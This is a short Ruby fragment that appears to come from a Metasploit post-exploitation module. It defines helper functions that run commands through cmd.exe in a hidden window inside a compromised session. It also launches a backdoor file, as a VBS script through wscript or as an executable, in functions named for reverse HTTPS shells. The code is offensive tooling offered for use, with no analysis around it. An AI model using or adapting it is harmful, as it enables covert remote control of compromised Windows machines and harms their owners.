def execute_cmd cmd_string
  print_status "executing: #{cmd_string}"
  session.sys.process.execute("cmd.exe /c #{cmd_string}", nil, {'Hidden' => 'true'})
end

def vbs_reverse_https path_to_backdoor, session
    execute_cmd "wscript #{path_to_backdoor}"
end

def exe_reverse_https path_to_backdoor, session
    print_status "executing ..."
    execute path_to_backdoor
end
